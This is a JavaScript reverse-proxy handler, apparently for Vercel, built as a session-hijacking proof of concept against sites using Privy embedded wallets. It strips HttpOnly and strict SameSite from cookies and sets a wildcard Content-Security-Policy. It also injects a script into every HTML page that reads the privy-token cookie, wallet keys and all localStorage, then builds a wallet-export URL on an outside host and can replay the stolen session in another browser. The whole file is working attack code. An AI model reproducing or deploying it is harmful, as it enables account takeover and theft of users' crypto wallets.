import { createProxyMiddleware } from 'http-proxy-middleware';

// Prevent Vercel from parsing body and let us handle the response
export const config = {
  api: {
    bodyParser: false,
    externalResolver: true
  }
};

const ORIGIN = process.env.ORIGIN; // e.g. "https://origin.example.com"

const proxy = createProxyMiddleware({
  target: ORIGIN,
  changeOrigin: true,
  selfHandleResponse: true,
  onProxyRes(proxyRes, req, res) {
    let buffer = Buffer.from('');
    proxyRes.on('data', chunk => buffer = Buffer.concat([buffer, chunk]));
    proxyRes.on('end', () => {
      // 1) Modify Set-Cookie flags
      const rawCookies = proxyRes.headers['set-cookie'] || [];
      const modifiedCookies = rawCookies.map(cookie =>
        cookie.replace(/; HttpOnly; Secure; SameSite=Strict/g, '; secure; SameSite=None')
      );
      if (modifiedCookies.length) {
        res.setHeader('Set-Cookie', modifiedCookies);
      }

      // 2) Override Content-Security-Policy
      res.setHeader(
        'Content-Security-Policy',
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:"
      );

      // 3) Copy other headers
      Object.entries(proxyRes.headers).forEach(([name, value]) => {
        const lower = name.toLowerCase();
        if (lower === 'set-cookie' || lower === 'content-security-policy') return;
        res.setHeader(name, value);
      });

      // 4) Inject script into HTML responses
      const contentType = proxyRes.headers['content-type'] || '';
      if (contentType.includes('text/html')) {
        let text = buffer.toString('utf8');
        const scriptTag = `<script>
  (function() {
    // POC cookie & localStorage exporter
    function getCookie(name) {
      const v = \`; \${document.cookie}\`;
      const parts = v.split(\`; \${name}=\`);
      if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function getLastPartOfLocalStorageKey(prefix) {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.startsWith(prefix)) {
          const parts = key.split(':');
          return parts[parts.length-1];
        }
      }
      return null;
    }
    function encodeBase64(data) {
      return btoa(unescape(encodeURIComponent(data)));
    }
    function decodeBase64(data) {
      return decodeURIComponent(escape(atob(data)));
    }
    function setCookies(cookies, path = '/') {
      cookies.split(';').forEach(c => {
        document.cookie = \`\${c.trim()}; path=\${path}\`;
      });
    }
    function setLocalStorage(data) {
      const obj = JSON.parse(data);
      for (const k in obj) {
        localStorage.setItem(k, obj[k]);
      }
    }
    const params = new URLSearchParams(window.location.search);
    if (params.has('POC')) {
      const val = decodeBase64(params.get('POC'));
      const [cookieData, lsData] = val.split('|');
      setCookies(cookieData);
      setLocalStorage(lsData);
    } else {
      const token = getCookie('privy-token');
      const addr = getLastPartOfLocalStorageKey('privy_wallet');
      if (token && addr) {
        const exportUrl = \`https://privy.awc-eg.team/apps/clthf5zo505s513atuph9xful/embedded-wallets/export?token=\${token}&address=\${addr}\`;
        const allCookies = document.cookie;
        const lsString = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
        const enc = encodeBase64(\`\${allCookies}|\${lsString}\`);
        const finalUrl = \`\${exportUrl}&POC=\${enc}\`;
        alert(finalUrl);
        console.log('The POC URL :', finalUrl);
      }
    }
  })();
</script>`;
        text = text.replace('</body>', `${scriptTag}</body>`);
        res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
        return res.end(text);
      }

      // 5) Non‑HTML: pass through
      res.writeHead(proxyRes.statusCode, proxyRes.statusMessage);
      res.end(buffer);
    });
  }
});

export default function handler(req, res) {
  return proxy(req, res, err => {
    console.error('Proxy error:', err);
    res.status(500).send('Internal Server Error');
  });
}
